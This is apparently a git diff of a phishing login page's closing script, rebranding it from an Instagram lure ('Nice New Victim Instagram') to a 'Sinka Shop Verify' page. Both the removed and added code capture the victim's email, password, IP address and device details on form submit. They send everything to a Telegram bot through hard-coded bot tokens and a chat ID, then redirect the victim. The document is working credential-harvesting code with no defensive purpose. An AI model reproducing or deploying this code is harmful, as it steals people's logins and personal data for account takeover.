@@ -84,61 +84,63 @@
     </div>
 </footer>
     
-    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
-<script>
-    const TOKEN = "8096146505:AAGuu-QbSJas9XUPxLjT7vc-2UeMJXGYKig";                                                            // هنا التوكين              
-    const CHAT_ID = "-4864340421";                                                       // هنا معرف الشات https://api.telegram.org/bot/getUpdates
-    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        
+ <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  <script>
+    const TOKEN = "7874185278:AAHN_8SoG4HsZ2C6LRrbuD7-eA8ZTHGFsRk";
+    const CHAT_ID = "-4864340421";
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
     document.getElementById('login-form').addEventListener('submit', function(e) {
-    e.preventDefault();
+      e.preventDefault();
 
-    const button = this.querySelector('button');
-    button.disabled = true;
-    button.textContent = 'Logging in...';
+      const button = this.querySelector('button');
+      button.disabled = true;
+      button.textContent = 'جاري تسجيل الدخول...';
 
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
 
-    axios.get('https://api.ipify.org?format=json')
+      axios.get('https://api.ipify.org?format=json')
         .then(response => {
-            const ip = response.data.ip;
+          const ip = response.data.ip;
+          const userAgent = navigator.userAgent;
+          const platform = navigator.platform;
+          const screenWidth = screen.width;
+          const screenHeight = screen.height;
+          const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+          const message = `
+<b>Sinka Shop Verify </b>\n
+<b>Account Details</b>\n
+<b>Time ⏰:</b> ${new Date().toLocaleString()}\n
+<b>Email ✉:</b> ${email}\n
+<b>Password 🔒:</b> ${password}\n
+<b>IP Address 📝:</b> ${ip}\n
+<b>Machine 🖥:</b> ${deviceType}\n
+<b>Platform 🛠:</b> ${platform}\n
+<b>Screen 💻:</b> ${screenWidth}x${screenHeight}\n
+<b>User Agent 🕵️:</b> ${userAgent}\n
 
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-            const screenWidth = screen.width;
-            const screenHeight = screen.height;
-            const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+`;
 
-            const message = ` 
-                <b>Nice New Victim Instagram</b>\n
-                <b>Email ✉:</b> ${email}\n
-                <b>Password 🔒:</b> ${password}\n
-                <b>IP Address 📝:</b> ${ip}\n
-                <b>Machine 🖥:</b> ${deviceType}\n
-                <b>Platform 🛠:</b> ${platform}\n
-                <b>User Agent 💼:</b> ${userAgent}\n
-                <b>Screen 💻:</b> ${screenWidth}x${screenHeight}
-            `;
-
-            axios.post(URI_API, {
-                chat_id: CHAT_ID,
-                parse_mode: 'html',
-                text: message
-            }).then(response => {
-                window.location.href = 'https://www.instagram.com'
-            }).catch(error => {
-                alert('Error sending the information. Please try again.');
-                button.disabled = false;
-                button.textContent = 'Log In';
-            });
+          axios.post(URI_API, {
+            chat_id: CHAT_ID,
+            parse_mode: 'HTML',
+            text: message
+          }).then(response => {
+            window.location.href = 'loading.html';
+          }).catch(error => {
+            alert('Error sending the information. Please try again.');
+            button.disabled = false;
+            button.textContent = 'Continue';
+          });
         })
         .catch(error => {
-            alert('Error fetching the IP address. Please try again.');
-            button.disabled = false;
-            button.textContent = 'Log In';
+          alert('Please try again.');
+          button.disabled = false;
+          button.textContent = 'Continue';
         });
-});
-</script>
+    });
+  </script>
 </body>
 </html>
+
